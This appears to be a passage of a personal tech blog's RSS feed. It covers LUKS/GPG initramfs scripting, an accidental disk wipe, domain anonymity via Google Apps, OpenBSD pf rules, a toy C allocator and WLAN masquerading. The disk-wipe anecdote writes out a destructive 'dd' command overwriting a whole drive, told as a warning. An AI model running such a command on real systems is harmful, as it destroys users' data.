    Ã¢â€â€Ã¢â€â‚¬Ã¢â€â‚¬ bin

15 directories, 7 files
</code></pre></div><p>Make sure all <strong>binaries</strong> are <strong>statically</strong> linked. And this is my <strong>init script</strong>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ cat init 
#!/bin/busybox sh

# Some useful functions
rescue_shell() {
    echo &#34;Something went wrong. Dropping you to a shell.&#34;
    busybox --install -s
    exec /bin/busybox sh
}

# GPG workaround
cp -a /dev/console /dev/tty

# Mount the /proc and /sys filesystems.
mount -t proc none /proc
mount -t sysfs none /sys

busybox --install -s
mdev -s 
echo /bin/mdev &gt; /proc/sys/kernel/hotplug

# Decrypt root
while [ ! -e /root/keys/sda1_key ] ; do
   sleep 2
   echo &#34;&gt; Decrypt root ...&#34;
   gpg -o /root/keys/sda1_key -d /root/keys/sda1_key.gpg 2&gt; /dev/null
done

# Unlock partition
cryptsetup -d /root/keys/sda1_key luksOpen /dev/sda1 root

# Mount new root 
mount /dev/mapper/root /new-root

# Create swap device
cryptsetup -c twofish -h sha256 -d /dev/urandom create swap /dev/sda6
mkswap /dev/mapper/swap

# Unmount old root
umount -l /proc
umount -l /sys

# Start new system
exec switch_root /new-root /sbin/init || rescue_shell
</code></pre></div><p>Don&rsquo;t forget to copy your <strong>keys</strong> to */root/keys/Â *and rename them properly. Afterwards all you have to do is to create the initramfs file:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ cd /usr/src/initramfs
$ find . -print0 | cpio --null -ov --format=newc | gzip -9 &gt; /boot/initramfs.cpio.gz
</code></pre></div><p>That&rsquo;s all!</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Think before you type part 2</title>
      <link>https://blog.dornea.nu/2011/02/26/think-before-you-type-part-2/</link>
      <pubDate>Sat, 26 Feb 2011 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2011/02/26/think-before-you-type-part-2/</guid>
      <content:encoded><![CDATA[<p>This is the type of post where I blame myself for my stupidity (I&rsquo;d call it rather carelessness)What happened? Well all I wanted to do was:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ dd if=/dev/urandom of=/dev/sda3
</code></pre></div><p>Beware of the &ldquo;3&rdquo; at the end. I don&rsquo;t know what really happened but at the end dd was running with:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ dd if=/dev/urandom of=/dev/sda
</code></pre></div><p>Damn! I was like: &ldquo;F***! All my data!&rdquo; Fortunately only 4 MBs were &ldquo;randomized&rdquo;. That means: No partition table more! Â I tried gpart &amp; co. No success! Backup all data and start from the beginning. So what&rsquo;s todays lesson? There will be hopefully no more &ldquo;think before you type&rdquo; post!!</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Stay clean and anonymous with Google Apps</title>
      <link>https://blog.dornea.nu/2011/02/10/stay-clean-and-anonymous-with-google-apps/</link>
      <pubDate>Thu, 10 Feb 2011 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2011/02/10/stay-clean-and-anonymous-with-google-apps/</guid>
      <content:encoded><![CDATA[<p>I was recently reading some documentary article about the Mexican drug war near USA&rsquo;s national border. Actually it was rather an interview with some guy who fights against the (corrupt) authorities and the drugs leaders by running some informative blog. Feel free to activate your investigative mind and find out which blog I&rsquo;m talking about&hellip;</p>
<p>So this guy was clever enough to hide its identity - what would you do in his case ? - by hiding the domains whois information. These days all you have to do is to find some serious registrar, use some CC and there you go: All your sensible information will be kept private against spammers, hax0rs, feds, &hellip;drug leaders.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Domain Name:     xxx
$ whois xxx
...
Registrar:       Name.com LLC

Protected Domain Services Customer ID: NCR-xxx

Expiration Date: xxx
Creation Date:   xxx

Name Servers:
        NS1.NAME.COM
        NS2.NAME.COM
        NS3.NAME.COM
        NS4.NAME.COM

REGISTRANT CONTACT INFO
Protected Domain Services - Customer ID: NCR-xxx
P.O. Box 6197
Denver
CO
80206
US
Phone:         +1.7202492374 
Email Address: xxx_at_protecteddomainservices.com
</code></pre></div><p>Ok that&rsquo;s DNS. What about (web) hosting? And here comes the interesting part. I was thinking of some .ru / .pk / .ro (&hellip;) hosters to serve the blog content. Far fetched!</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ dig xxx

; &lt;&lt;&gt;&gt; DiG 9.7.2-P3 &lt;&lt;&gt;&gt; xxx
;; global options: +cmd
;; Got answer:
;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 35710
;; flags: qr rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 0

;; QUESTION SECTION:
;xxx.              IN      A

;; ANSWER SECTION:
xxx.       1782    IN      CNAME   ghs.google.com.
ghs.google.com.         21506   IN      CNAME   ghs.l.google.com.
ghs.l.google.com.       95      IN      A       74.125.43.121

;; Query time: 4 msec
;; SERVER: xxx
;; WHEN: Thu Feb 10 19:40:05 2011
;; MSG SIZE  rcvd: 95
</code></pre></div><p>Google? Aeehhh? Ok. Let&rsquo;s be sure about that and do some reverse lookup. Therefor I&rsquo;ve used my favourite online dns tool DomainTools.com and voila:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Reverse IP: 1,176,001 other sites hosted on this server.
</code></pre></div><p>0_o Now I&rsquo;m really confused. Let&rsquo;s hang on for a minute, take a deep breath and seek for the facts: Google seems to host this site and other 1.176.001 other sites too. How can this be? (please forgive me for my naive curiosity, but before this I had no clue about the concept behind this whole thing)</p>
<p>A quick Google search gave me the answer I was looking for: <a href="http://www.google.com/apps/">Google Aps</a>. (I use Google to find out more about Google. Quite ironically, isn&rsquo;t it?) The whole Internet is full of entries related to these Apps. Everybody seems to use these free services - besides me. I&rsquo;ve never heard of Google Apps before. Did you? Never mind. Infact I knew <a href="http://www.google.com/sites/overview.html">Google Sites</a> which is - in my own oppinion - the easiest way (forget WordPress!) to create a site adapted to your needs in less than 10 minutes. So this is where the whole story ends at.</p>
<p>Supposing you have already achived your whois protected domain, Google will help you map your Google site to your OWN url as stated <a href="http://www.google.com/support/sites/bin/answer.py?hl=en&amp;answer=99448">here</a>. You&rsquo;ll need to have full access to the DNS administration of your domain and change some <a href="http://en.wikipedia.org/wiki/CNAME_record">CNAME</a> entries. Afterwards you&rsquo;ll have your domain pointing to the Google site. BTW: If you like <a href="http://blogger.com">Blogger.com</a> you may want to check <a href="http://www.google.com/support/blogger/bin/answer.py?hl=en&amp;answer=55373">this</a> out. This whole hocus pocus works with MX entries too. So if you want to map your mail address <a href="mailto:me@example.com">me@example.com</a> to your Google accounts mail address,Â  follow <a href="http://www.google.com/support/a/bin/answer.py?hl=en&amp;answer=33352">these</a> instructions.</p>
<p>So if you ever had some criminal plans in mind or planed doing some <code>private</code> stuff, Google might be your friend.</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>OpenBSD 4.8 - First impressions</title>
      <link>https://blog.dornea.nu/2011/02/04/openbsd-4.8-first-impressions/</link>
      <pubDate>Fri, 04 Feb 2011 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2011/02/04/openbsd-4.8-first-impressions/</guid>
      <content:encoded><![CDATA[<p>Today I had the big opportunity to setup an OpenBSD based gateway. I&rsquo;ve never used OpenBSD before and I was really excited about. All in one: Really clean (almost spartanic), secure 4.4BSD. Although I had some problems during the partitioning process - I didn&rsquo;t thought they have such a l33t partitioning tool - the installation went smooth. Afterwards I&rsquo;ve fetched the <a href="http://www.openbsd.org/faq/faq15.html">ports</a> and installed some common utilities: No compilation errors etc.</p>
<p>Here some pics:</p>
<p><img src="/posts/img/2011/230/04022011268.jpg" alt=""></p>
<p><img src="/posts/img/2011/230/04022011269.jpg" alt=""></p>
<p>Then my first ipf configuration:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># Set network interfaces
ext_if=sk0 #internet
int_if=sk1  #LAN
# Allowed  icmp type
icmp_types=echoreq

# Skip all loopback traffic
set skip on lo

# Scrub all traffic
scrub in

# Perform NAT on external interface
nat on $ext_if from $int_if:network -&gt; ($ext_if:0)

# Define default behavior: block IN, pass OUT
block in
pass out keep state

# Allow inbound traffic on internal interface
pass quick on $int_if

# No spoofing
antispoof quick for { lo $int_if }
</code></pre></div><p>Quite easy, isn&rsquo;t it?</p>
<p><strong>[Update: 2011-02-17]</strong></p>
<p>As stated <a href="http://www.openbsd.org/faq/upgrade47.html">here</a> there have been some changes made to the pf syntax in 4.8.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># Perform NAT on external interface
nat on $ext_if from $int_if:network -&gt; ($ext_if:0)
</code></pre></div><p>should be changed to</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">..
match out on $ext_if from $int_if nat-to ($ext_if)
...
</code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>Simple memory managment using linked lists (implement my_malloc and my_free)</title>
      <link>https://blog.dornea.nu/2010/12/06/simple-memory-managment-using-linked-lists-implement-my_malloc-and-my_free/</link>
      <pubDate>Mon, 06 Dec 2010 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2010/12/06/simple-memory-managment-using-linked-lists-implement-my_malloc-and-my_free/</guid>
      <content:encoded><![CDATA[<p>Suppose you were a Linux developer and you&rsquo;re about to implement the well known system calls:Â  <strong>malloc</strong> and <strong>free</strong>. How would you start? Which (already implemented) functions would you use? How would you <strong>organize</strong> your (free) <strong>memory</strong>? Which information would you like to have about certain memory regions? Those are the minimal problems you&rsquo;re about to face with. What about <strong>memory fragmentation</strong>? Speaking of memory: How would you implement this thing called <code>memory</code>? And so on..</p>
<p>The same task caused me a few weeks ago a lot of head scratching. Although I had a framework I could work with, it was more sophisticated than I thought. But let&rsquo;s start with simple things and have a look at the memory I was supposed to use:</p>
<p><img src="/posts/img/2010/222/mm_char_memory.png" alt="Memory representation"></p>
<p>So that&rsquo;s my memory: a simple char array of BUFFSIZE elements. My code is supposed to use this range of memory in an intelligent way. Therefore we&rsquo;ll have to split the memory into multiple <strong>fragments</strong>. Each fragment has a certain size (they don&rsquo;t have to be at the same size) and coresponds to memory that has been allocated to a variable.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.c" data-lang=".c"><span style="color:#6ab825;font-weight:bold">int</span> *a = (<span style="color:#6ab825;font-weight:bold">int</span>*)my_malloc(<span style="color:#6ab825;font-weight:bold">sizeof</span>(<span style="color:#6ab825;font-weight:bold">int</span>));
*a = <span style="color:#3677a9">5</span>;

<span style="color:#6ab825;font-weight:bold">char</span>* b = (<span style="color:#6ab825;font-weight:bold">char</span>*)my_malloc(<span style="color:#3677a9">100</span>);
status();
b[<span style="color:#3677a9">0</span>] = <span style="color:#ed9d13">&#39;c&#39;</span>;
b[<span style="color:#3677a9">1</span>] = <span style="color:#ed9d13">&#39;o&#39;</span>;
b[<span style="color:#3677a9">2</span>] = <span style="color:#ed9d13">&#39;o&#39;</span>;
b[<span style="color:#3677a9">3</span>] = <span style="color:#ed9d13">&#39;l&#39;</span>;
b[<span style="color:#3677a9">4</span>] = <span style="color:#ed9d13">&#39;ï¿½&#39;</span>;
</code></pre></div><p><strong>my_malloc(int size)</strong> returns the address of the fragment that has been assigned to variable a or b. When there is no more space left on the memory, NULL will be returned. The same applies when free fragments can&rsquo;t be merged together to a bigger one - in this case we&rsquo;ll have to remap the fragments in order to have enough space for later memory allocations.Â  Furthermore you can tell* my_malloc* how much space to allocate.</p>
<p>So there must be a way how to organize our fragments inside the memory. By using only pointer to certain addresses within the memory space we have no information about its size, the data size it is storing or the next fragment. That&rsquo;s why a so called <strong>memoryBlock</strong> will be used to store this information. Given a <strong>head</strong> block a linked list should allow us to access all blocks in the memory.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.c" data-lang=".c"><span style="color:#6ab825;font-weight:bold">enum</span> memBlockState{not_allocated=<span style="color:#3677a9">0</span>, allocated=<span style="color:#3677a9">1</span>};

<span style="color:#999;font-style:italic">// memory block
</span><span style="color:#999;font-style:italic"></span><span style="color:#6ab825;font-weight:bold">typedef</span> <span style="color:#6ab825;font-weight:bold">struct</span> _memoryblock {
    <span style="color:#6ab825;font-weight:bold">void</span>* data;                                       <span style="color:#999;font-style:italic">// points to the data
</span><span style="color:#999;font-style:italic"></span>    <span style="color:#6ab825;font-weight:bold">int</span> dataLength;                     
    <span style="color:#6ab825;font-weight:bold">enum</span> memBlockState state;             <span style="color:#999;font-style:italic">// Is this Block free?
</span><span style="color:#999;font-style:italic"></span>    <span style="color:#6ab825;font-weight:bold">struct</span> _memoryblock * nextBlock;    <span style="color:#999;font-style:italic">// points to the next entry
</span><span style="color:#999;font-style:italic"></span>} memoryBlock;

<span style="color:#cd2828;font-weight:bold">#define memoryBlockHeaderSize sizeof(memoryBlock)
</span><span style="color:#cd2828;font-weight:bold"></span>
<span style="color:#999;font-style:italic">// First block in the list
</span><span style="color:#999;font-style:italic"></span>memoryBlock* head;
</code></pre></div><p>And this is the graphical representation:</p>
<p><img src="/posts/img/2010/222/mm_head.png" alt="Memory Block(s) inside memory"></p>
<p>Now we&rsquo;ll have to inter-connect the memory blocks. Therefor we&rsquo;ll be using a <strong>pointer</strong> to next block. In that way we can iterate the blocks, (re)move them or find a suitable place where to place a new block.</p>
<p><img src="/posts/img/2010/222/mm_head_nextblock.png" alt="nextBlock pointer"></p>
<p>So those are the most important programm structures. Let&rsquo;s have a look at the main function within the C-code (see appendix):</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.c" data-lang=".c"><span style="color:#999;font-style:italic">// my_alloc will try to allocate &lt;byteCount&gt; bytes within our char memory. 
</span><span style="color:#999;font-style:italic">// The function will return the address of the allocated memory.
</span><span style="color:#999;font-style:italic"></span><span style="color:#6ab825;font-weight:bold">void</span>* <span style="color:#447fcf">my_malloc</span>(<span style="color:#6ab825;font-weight:bold">int</span> byteCount)
{
    memoryBlock *searchBlock = head, *tmp;
    <span style="color:#6ab825;font-weight:bold">if</span>(!b_initialized)
        initialize();

    <span style="color:#999;font-style:italic">// If we don&#39;t have enough place to allocate then we give up and return NULL
</span><span style="color:#999;font-style:italic"></span>    <span style="color:#6ab825;font-weight:bold">if</span>(byteCount &gt; get_free_space())
        <span style="color:#6ab825;font-weight:bold">return</span>(<span style="color:#24909d">NULL</span>);

    <span style="color:#999;font-style:italic">// Search for the block whose dataLength &gt;= byteCount
</span><span style="color:#999;font-style:italic"></span>    <span style="color:#6ab825;font-weight:bold">while</span> (searchBlock-&gt;dataLength &lt; byteCount)
        searchBlock = searchBlock-&gt;nextBlock;

    <span style="color:#999;font-style:italic">// We have found an unused memory block. Now we split it. 
</span><span style="color:#999;font-style:italic"></span>    tmp = splitBlock(searchBlock, byteCount);

    <span style="color:#999;font-style:italic">// Return the address of data (see memoryBlock structure)
</span><span style="color:#999;font-style:italic"></span>    <span style="color:#6ab825;font-weight:bold">return</span> tmp-&gt;data;
}
</code></pre></div><p>Before beeing able to allocate some memory, the <strong>head</strong> block must be initialized.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.c" data-lang=".c"><span style="color:#6ab825;font-weight:bold">void</span> <span style="color:#447fcf">initialize</span>()
{
    <span style="color:#6ab825;font-weight:bold">if</span>(!b_initialized)
    {
        b_initialized = <span style="color:#3677a9">1</span>;

        <span style="color:#999;font-style:italic">// head will point to the address of memory
</span><span style="color:#999;font-style:italic"></span>        head = (memoryBlock*)memory;

        <span style="color:#999;font-style:italic">// The data offset is &gt;beginning of memoryBlock&gt; + memoryBlockHeaderSize
</span><span style="color:#999;font-style:italic"></span>        head-&gt;data = head + memoryBlockHeaderSize;
        head-&gt;dataLength = <span style="color:#6ab825;font-weight:bold">sizeof</span>(memory) - memoryBlockHeaderSize;

        <span style="color:#999;font-style:italic">// self-explanatory
</span><span style="color:#999;font-style:italic"></span>        head-&gt;state = not_allocated;
        head-&gt;nextBlock = <span style="color:#24909d">NULL</span>;
    }
}
</code></pre></div><p>I think the most interesting part of the allocation process is the <strong>splitBlock</strong> function. It searches for the proper block that has to be splitted into 2 parts:</p>
<ul>
<li>a smaller unused/unallocated memory block (new size = old size - byteCount)</li>
<li>an allocated memory block (size = byteCount)</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.c" data-lang=".c">memoryBlock *<span style="color:#447fcf">splitBlock</span>(memoryBlock* block, <span style="color:#6ab825;font-weight:bold">int</span> byteCount)
{
    memoryBlock *new_block;

    <span style="color:#999;font-style:italic">// When no enough space in the current block -&gt; return NULL
</span><span style="color:#999;font-style:italic"></span>    <span style="color:#6ab825;font-weight:bold">if</span> (byteCount &gt; block-&gt;dataLength)
        <span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#24909d">NULL</span>;

    <span style="color:#999;font-style:italic">// Update blocks dataLength
</span><span style="color:#999;font-style:italic"></span>    block-&gt;dataLength -= (memoryBlockHeaderSize + byteCount);

    <span style="color:#999;font-style:italic">// Create new block
</span><span style="color:#999;font-style:italic"></span>    new_block = (memoryBlock*)((<span style="color:#6ab825;font-weight:bold">char</span> *)block + memoryBlockHeaderSize + block-&gt;dataLength);

    <span style="color:#999;font-style:italic">// ... set data pointer
</span><span style="color:#999;font-style:italic"></span>    new_block-&gt;data = (<span style="color:#6ab825;font-weight:bold">void</span> *)((<span style="color:#6ab825;font-weight:bold">char</span> *)new_block + memoryBlockHeaderSize);

    new_block-&gt;dataLength = byteCount;
    new_block-&gt;state = allocated;

    <span style="color:#999;font-style:italic">// new_block.nextBlock will point to right neighbour of block
</span><span style="color:#999;font-style:italic"></span>    new_block-&gt;nextBlock = block-&gt;nextBlock;

    block-&gt;nextBlock = new_block;

    <span style="color:#6ab825;font-weight:bold">return</span> new_block;

}
</code></pre></div><p>After some dry runs - allocating memory for some integer/string variables (check out <em>test_mm.c</em>) - the memory could end up like this:</p>
<p><img src="/posts/img/2010/222/mm_memory_fragmentation.png" alt="Memory fragmentation"></p>
<p>As you see we could re-arrange the allocated regions in order to get more unused/free memory space. Since this wasn&rsquo;t part of the task - although you could have a look at my_free() too - Â  I&rsquo;ll leave it to you to google for some dynamic memory allocation algorithms.</p>
<p>In the end I&rsquo;d like to show you some debugging stuff I&rsquo;ve made with <strong>ddd</strong>. As you see each (allocated) portion of memory has its memory header (consisting of the memoryBlock structure) plus a (void *) pointerÂ  to an address inside the memory, where data is stored.</p>
<p><img src="/posts/img/2010/222/mm_ddd_session.png" alt="Memory Block(s) inside memory"></p>
<p>Finally some output generated by the programm:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Uebersicht des Speichers: 10216 / 10240 Speicher frei
------------------------------------------------
#  at            allocated       space   data                   next block
1  0x5024a0      FALSE           10216   [0x5026e0,0x504ec7]    0x0

[DEBUG] Split block at 0x5024a0

5
Uebersicht des Speichers: 10188 / 10240 Speicher frei
------------------------------------------------
#  at            allocated       space   data                   next block
1  0x5024a0      FALSE           10188   [0x5026e0,0x504eab]    0x504c84
2  0x504c84      TRUE            4       [0x504c9c,0x504c9f]    0x0

[DEBUG] Split block at 0x5024a0

Uebersicht des Speichers: 10064 / 10240 Speicher frei
------------------------------------------------
#  at            allocated       space   data                   next block
1  0x5024a0      FALSE           10064   [0x5026e0,0x504e2f]    0x504c08
2  0x504c08      TRUE            100     [0x504c20,0x504c83]    0x504c84
3  0x504c84      TRUE            4       [0x504c9c,0x504c9f]    0x0

cool

[DEBUG] Split block at 0x5024a0

Uebersicht des Speichers: 9960 / 10240 Speicher frei
------------------------------------------------
#  at            allocated       space   data                   next block
1  0x5024a0      FALSE           9960    [0x5026e0,0x504dc7]    0x504ba0
2  0x504ba0      TRUE            80      [0x504bb8,0x504c07]    0x504c08
3  0x504c08      TRUE            100     [0x504c20,0x504c83]    0x504c84
4  0x504c84      TRUE            4       [0x504c9c,0x504c9f]    0x0

Konnte kein Speicher allozieeren
Uebersicht des Speichers: 9960 / 10240 Speicher frei
------------------------------------------------
#  at            allocated       space   data                   next block
1  0x5024a0      FALSE           9960    [0x5026e0,0x504dc7]    0x504ba0
2  0x504ba0      TRUE            80      [0x504bb8,0x504c07]    0x504c08
3  0x504c08      TRUE            100     [0x504c20,0x504c83]    0x504c84
4  0x504c84      TRUE            4       [0x504c9c,0x504c9f]    0x0

[DEBUG] Free block at 0x504c08

Uebersicht des Speichers: 9960 / 10240 Speicher frei
------------------------------------------------
#  at            allocated       space   data                   next block
1  0x5024a0      FALSE           9960    [0x5026e0,0x504dc7]    0x504ba0
2  0x504ba0      TRUE            204     [0x504bb8,0x504c83]    0x504c84
3  0x504c84      TRUE            4       [0x504c9c,0x504c9f]    0x0

Uebersicht des Speichers: 9960 / 10240 Speicher frei
------------------------------------------------
#  at            allocated       space   data                   next block
1  0x5024a0      FALSE           9960    [0x5026e0,0x504dc7]    0x504ba0
2  0x504ba0      TRUE            204     [0x504bb8,0x504c83]    0x504c84
3  0x504c84      TRUE            4       [0x504c9c,0x504c9f]    0x0

[DEBUG] Split block at 0x5024a0

Uebersicht des Speichers: 9856 / 10240 Speicher frei
------------------------------------------------
#  at            allocated       space   data                   next block
1  0x5024a0      FALSE           9856    [0x5026e0,0x504d5f]    0x504b38
2  0x504b38      TRUE            80      [0x504b50,0x504b9f]    0x504ba0
3  0x504ba0      TRUE            204     [0x504bb8,0x504c83]    0x504c84
4  0x504c84      TRUE            4       [0x504c9c,0x504c9f]    0x0

[DEBUG] Free block at 0x504ba0

Uebersicht des Speichers: 9856 / 10240 Speicher frei
------------------------------------------------
#  at            allocated       space   data                   next block
1  0x5024a0      FALSE           9856    [0x5026e0,0x504d5f]    0x504b38
2  0x504b38      TRUE            308     [0x504b50,0x504c83]    0x504c84
3  0x504c84      TRUE            4       [0x504c9c,0x504c9f]    0x0

[DEBUG] Free block at 0x504c84

Uebersicht des Speichers: 9856 / 10240 Speicher frei
------------------------------------------------
#  at            allocated       space   data                   next block
1  0x5024a0      FALSE           9856    [0x5026e0,0x504d5f]    0x504b38
2  0x504b38      TRUE            336     [0x504b50,0x504c9f]    0x0

[DEBUG] Free block at 0x504b38

Uebersicht des Speichers: 10216 / 10240 Speicher frei
------------------------------------------------
#  at            allocated       space   data                   next block
1  0x5024a0      FALSE           10216   [0x5026e0,0x504ec7]    0x0

Press any key to continue...(Where&#39;s the &#39;any&#39; key btw?)
</code></pre></div><p><strong>Download material:</strong></p>
<table style="width: 100%;" border="1" cellspacing="1" cellpadding="1">
  <tr>
    <td class="rtecenter" style="background-color: #9999ff;" colspan="2">
      <strong>mm.c</strong>
    </td>
<pre><code>&lt;td style=&quot;border-color: #000000;&quot;&gt;
  &lt;a href=&quot;http://git.dornea.nu/studium/raw/master/wise2010-2011/ti3/exercises/0x4/Aufgabe_4/mm.c&quot;&gt;http://git.dornea.nu/studium/raw/master/wise2010-2011/ti3/exercises/0x4/Aufgabe_4/mm.c&lt;/a&gt;
&lt;/td&gt;
</code></pre>
  </tr>
  <tr>
    <td class="rtecenter" style="background-color: #9999ff;" colspan="2">
      <strong>mm.h</strong>
    </td>
<pre><code>&lt;td style=&quot;border-color: #000000;&quot;&gt;
  &lt;a href=&quot;http://git.dornea.nu/studium/raw/master/wise2010-2011/ti3/exercises/0x4/Aufgabe_4/mm.h&quot;&gt;http://git.dornea.nu/studium/raw/master/wise2010-2011/ti3/exercises/0x4/Aufgabe_4/mm.h&lt;/a&gt;
&lt;/td&gt;
</code></pre>
  </tr>
  <tr>
    <td class="rtecenter" style="background-color: #9999ff;" colspan="2">
      <strong>test_mm.c</strong>
    </td>
<pre><code>&lt;td style=&quot;border-color: #000000;&quot;&gt;
  &lt;a href=&quot;http://git.dornea.nu/studium/raw/master/wise2010-2011/ti3/exercises/0x4/Aufgabe_4/test_mm.c&quot;&gt;http://git.dornea.nu/studium/raw/master/wise2010-2011/ti3/exercises/0x4/Aufgabe_4/test_mm.c&lt;/a&gt;
&lt;/td&gt;
</code></pre>
  </tr>
</table>
]]></content:encoded>
    </item>
    
    <item>
      <title>HowTo: SNAT/IP Masquerade between 2 wlan cards on Linux</title>
      <link>https://blog.dornea.nu/2010/11/25/howto-snat/ip-masquerade-between-2-wlan-cards-on-linux/</link>
      <pubDate>Thu, 25 Nov 2010 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2010/11/25/howto-snat/ip-masquerade-between-2-wlan-cards-on-linux/</guid>
      <content:encoded><![CDATA[<p>Although this is a quite minimalistic howto you should be able to do IP masquerading between your WLAN cards in less than 2 minutes. As I posted <a href="http://lists.debian.org/debian-user/2010/10/msg00884.html">here</a> I&rsquo;d like to share use my WLAN cards to share one cards Internet connection with the other one. The following steps don&rsquo;t apply only to wifi cards. The same commands should work on Ethernet cards too. Let&rsquo;s start&hellip;</p>
<h2 id="the-big-picture">The Big picture</h2>
<p><img src="/posts/img/2010/220/snat-ip-masquerade.png" alt="The big picture"></p>
<p>As you see you have 2 networks:</p>
<ul>
<li>10.0.0.x (on wlan1)</li>
<li>192.168.178.x (wlan0)</li>
</ul>
<p>wlan1 will act as a Access Point waiting for incomming connections and wlan0 will be connected to the Internet via FritzBox. Let&rsquo;s get all the pieces together.</p>
<h2 id="configure-wlan0">Configure wlan0</h2>
<p>Well there is not much to say about this section. Make sure you have a working Internet connection via wlan0.</p>
<h2 id="configure-wlan1">Configure wlan1</h2>
<p>Now comes the more interesting part. You want to allow your clients (whoever they are) to connect to your host via <strong>wlan1</strong> and use the Internet connection on <strong>wlan0</strong>. Pretty much &hellip; simple! Let&rsquo;s sum up which steps are required:</p>
<ul>
<li>Allow users to connect to wlan1</li>
<li>Make sure clients get an IP address which is different <strong>wlan0â€²s</strong> one (just for simplicity sake)</li>
<li>Allow your host to do <a href="http://en.wikipedia.org/wiki/IP_forwarding">IP Forwarding</a></li>
<li>Forward packets comming from <strong>wlan1</strong> to <strong>wlan0</strong></li>
<li>Forward packets which refer to our <em>10.0.0.x</em> network from <strong>wlan0</strong> to <strong>wlan1</strong></li>
</ul>
<h2 id="configure-hostapd">Configure hostapd</h2>
<p>That sounds quite simple, isn&rsquo;t it? Suppose <strong>wlan1</strong> is already listening for incoming connection. You can achieve that by using <strong>hostapd</strong>Â  and thereby acting like an Access Point on <strong>wlan1</strong>. Maybe I&rsquo;ll write an additional tutorial related to this topic. But by now let&rsquo;s say hostapd is running (among with **dhcpd, **which will assign IP addresses to the clients) and your clients are able to connect to your wifi interface and are successfully in getting an IP address.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># hostapd /etc/hostapd/hostapd.conf 
Configuration file: /etc/hostapd/hostapd.conf
Using interface wlan1 with hwaddr 00:11:22:33:44:55 and ssid &#39;HackLAN&#39;
</code></pre></div><p><strong>wlan1</strong> is now acting as an AP. That&rsquo;s fine for now. Now we must take care every clients will get a valid IP address. Let&rsquo;s have a look at <code>/etc/dhcpd/dhcpd.conf</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">...
subnet 10.0.0.0 netmask 255.255.255.0 {
  range 10.0.0.10 10.0.0.100;
  option routers 10.0.0.1;

  # These options HAVE to be changed
  option domain-name-servers 192.168.178.1;
  option domain-name &#34;fritz.box&#34;;
}
...
</code></pre></div><p>By this configuration we will assign IP addresses between 10.0.0.10 - 10.0.0.100 with netmask 10.0.0.255.Â  You might wonder about the last 2 lines. Well these ones have to be set individually. Have a look at <strong>/etc/resolv.conf</strong> and you&rsquo;ll know which domain-name-servers options you&rsquo;ll be using</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
nameserver 192.168.178.1
search fritz.box
